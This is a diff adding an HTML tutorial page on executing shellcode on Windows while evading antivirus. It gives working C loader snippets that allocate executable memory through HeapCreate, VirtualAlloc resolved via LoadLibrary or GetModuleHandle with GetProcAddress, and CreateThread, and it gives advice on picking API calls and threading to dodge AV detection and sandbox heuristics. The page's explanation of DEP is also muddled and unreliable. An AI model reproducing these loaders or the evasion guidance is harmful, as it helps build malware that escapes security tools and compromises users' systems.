@@ -1,0 +1,82 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Execute Shellcode</title>
+</head><body><b>Proper Ways To Execute Shellcodes</b><br/>
+<br/>
+Starting with Windows Vista, Microsoft introduced Data Execution Prevention or DEP[8], a security feature that can help prevent damage to your computer by monitoring programs from time to time. Monitoring ensures that running program uses system memory efficiently. If there is any instance of a program on your computer using memory incorrectly, DEP notices it, closes the program and notifies you. That means you can’t just put some bytes to an char array and execute it, you need to allocate a memory region with read,write and execute flags using windows API functions.<br/>
+<br/>
+Microsoft has several memory manipulation API functions for reserving memory pages, most of the common malware in the field uses the “VirtualAlloc” function for reserving memory pages, as you can guess common usage of functions helps AV products with defining detection rules, using other memory manipulation functions will also do the trick and they may attract less attention.<br/>
+<br/>
+I will list several shellcode execution method with different memory manipulation API function<br/>
+<br/>
+<b>HeapCreate/HeapAlloc:</b><br/>
+<br/>
+Windows also allows creating RWE heap regions.<br/>
+<br/>
+void ExecuteShellcode(){<br/>
+&nbsp; HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(Shellcode), sizeof(Shellcode));<br/>
+&nbsp; char * BUFFER = (char*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, sizeof(Shellcode));<br/>
+&nbsp; memcpy(BUFFER, Shellcode, sizeof(Shellcode));<br/>
+&nbsp; (*(void(*)())BUFFER)(); &nbsp;<br/>
+}<br/>
+<br/>
+<b>LoadLibrary/GetProcAddress:</b><br/>
+<br/>
+LoadLibrary and GetProcAddress win api function combination allows us to use all other win api functions, with this usage there will be no direct call to the memory manipulation function and malware will probably be less attractive.<br/>
+<br/>
+void ExecuteShellcode(){<br/>
+&nbsp; HINSTANCE K32 = LoadLibrary(TEXT("kernel32.dll"));<br/>
+&nbsp; if(K32 != NULL){<br/>
+&nbsp; &nbsp; MYPROC Allocate = (MYPROC)GetProcAddress(K32, "VirtualAlloc");<br/>
+&nbsp; &nbsp; char* BUFFER = (char*)Allocate(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br/>
+&nbsp; &nbsp; memcpy(BUFFER, Shellcode, sizeof(Shellcode));<br/>
+&nbsp; &nbsp; (*(void(*)())BUFFER)(); &nbsp;<br/>
+&nbsp; }<br/>
+}<br/>
+<br/>
+<b>GetModuleHandle/GetProcAddress:</b><br/>
+<br/>
+This method does not even uses the LoadLibrary function it takes advantage of already loaded kernel32.dll, GetModuleHandle function retrieves the module handle from an already loaded dll, this method is possibly one of the most silent way to execute shellcode.<br/>
+<br/>
+void ExecuteShellcode(){<br/>
+&nbsp; MYPROC Allocate = (MYPROC)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");<br/>
+&nbsp; char* BUFFER = (char*)Allocate(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br/>
+&nbsp; memcpy(BUFFER, Shellcode, sizeof(Shellcode));<br/>
+&nbsp; (*(void(*)())BUFFER)(); &nbsp;<br/>
+}<br/>
+<br/>
+<b>Multi Threading</b><br/>
+<br/>
+It is always harder to reverse engineer multi threaded PE files, it is also challenging for AV products, multi threading approach can be used with all execution methods above so instead of just pointing a function pointer to shellcode and executing it creating a new thread will complicate things for AV scanners plus it allow us to keep executing the “AV Detect” function while executing the shellcode at same time.<br/>
+<br/>
+void ExecuteShellcode(){<br/>
+&nbsp; char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br/>
+&nbsp; memcpy(BUFFER, Shellcode, sizeof(Shellcode));<br/>
+&nbsp; CreateThread(NULL,0,LPTHREAD_START_ROUTINE(BUFFER),NULL,0,NULL);<br/>
+&nbsp; while(TRUE){<br/>
+&nbsp; &nbsp; BypassAV(argv);<br/>
+&nbsp; } &nbsp;<br/>
+}<br/>
+Above code executes the shellcode with creating a new thread, just after creating the thread there is a infinite whlie loop that is executing bypass av function, this approach will almost double the effect of our bypass av function, bypass AV function will be keep checking for sandbox and dynamic analysis signs while shellcode runs, this is also vital for bypassing some advanced heuristic engines that waits until the execution of the shellcode.<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
